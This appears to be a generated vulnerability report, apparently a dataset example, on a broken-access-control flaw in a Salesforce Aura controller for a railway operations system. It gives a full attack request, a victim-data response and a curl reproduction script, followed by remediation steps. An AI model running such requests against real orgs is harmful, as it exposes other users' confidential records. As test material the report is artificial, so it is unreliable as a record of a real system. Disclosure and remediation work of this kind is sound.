# Security Analysis Report
**System:** RailCore Operations API (Salesforce-Integrated) — v2.0.0 (FINAL)
**Domain:** Railway / SCADA
**Example ID:** SF-0038
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `OpportunityController.getOpportunity` — attacker reads any Opportunity record without ownership check |

---

## Finding 1 — BAC: Functional Pivot on Opportunity Object (Pattern 2.1)

### Summary
The Apex controller `OpportunityController` on RailCore Operations API (`9d87e6c3.lightning.force.com`) is declared `without sharing`. Per §5.0 Pattern 2.1, the `getOpportunity` Aura action is vulnerable to a functional pivot: an attacker with a valid session substitutes any `opportunityId` value in the Aura `POST /aura` request to access Opportunity records owned by other users. The controller runs without sharing enforcement, bypasses OWD=Private on the Opportunity object, and contains no ownership predicate in its SOQL WHERE clause. In a railway/SCADA context, Opportunity records may contain safety-critical contract data, supplier credentials, and infrastructure-related PII.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.OpportunityController.getOpportunity`
**Affected endpoint:** `POST https://9d87e6c3.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://9d87e6c3.lightning.force.com/aura
Authorization: Bearer 00D9D87E6C3!AR9d87e6c3...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D9D87E6C3!AR9d87e6c3...

message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN",
"params":{"opportunityId":"001E6C3","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Opportunity Returned**
```json
{
  "actions": [
    {
      "id": "1;a",
      "state": "SUCCESS",
      "returnValue": {
        "records": [
          {
            "Id": "001E6C3",
            "Name": "Victim Opportunity Record",
            "OwnerId": "005VICTIM",
            "InternalNotes__c": "CONFIDENTIAL: internal review notes",
            "SensitiveData__c": "SSN: 000-79-9573"
          }
        ]
      },
      "error": []
    }
  ]
}
```

### Evidence Map

| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD=Private bypassed |
| §5.0 Pattern 2.1 | Functional pivot | Classification | Pivot from own records to victim's |
| §7.0 OWD | Opportunity: Private | Sharing config | User should only access owned records |
| §8.0 RISK-SF-038 | No `with sharing` | Risk code | Sharing rules not enforced |
| §8.0 RISK-SF-039 | No ownership SOQL predicate | Risk code | Any `opportunityId` accepted |
| HAR descriptor | `c.OpportunityController.getOpportunity` | Entry point | |
| HAR params | `opportunityId` | `001E6C3` | Victim's Opportunity record ID |
| HAR params | `fields` | Full sensitive list | `InternalNotes__c`, `SensitiveData__c` |
| HAR response | `OwnerId` | `005VICTIM` | Differs from attacker's session |
| HAR response | `SensitiveData__c` | `SSN: 000-79-9573` | Railway/SCADA personnel PII |

### Steps to Reproduce

```bash
# Step 1 — Authenticate with a valid Salesforce session on 9d87e6c3.lightning.force.com
SESSION="00D9D87E6C3!AR9d87e6c3..."

# Step 2 — Submit Aura action with victim opportunityId
curl -s -X POST "https://9d87e6c3.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.OpportunityController.getOpportunity","callingDescriptor":"UNKNOWN","params":{"opportunityId":"001E6C3","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'

# Expected (vulnerable): state: "SUCCESS", OwnerId: "005VICTIM", SensitiveData__c: "SSN: 000-79-9573"
# Expected (secure): state: "ERROR" or empty records array — INSUFFICIENT_ACCESS
```

### Remediation

1. **Declare controller `with sharing`:**
   ```apex
   public with sharing class OpportunityController { ... }
   ```
2. **Add ownership predicate to SOQL:**
   ```apex
   WHERE Id = :opportunityId AND OwnerId = :UserInfo.getUserId()
   ```
   plus `WITH SECURITY_ENFORCED`
3. **Validate `opportunityId` against the session user's accessible record set before querying.**
4. **Remove client-controlled `fields` parameter** — define a server-side field allowlist for the Opportunity function instead.
5. **Validate `aura.token`** — the submitted value is `undefined`, bypassing any token check.
6. **Railway/SCADA note:** Opportunity records in this platform may contain SCADA contract data and personnel PII. NERC CIP and UK Network Rail data security standards apply.
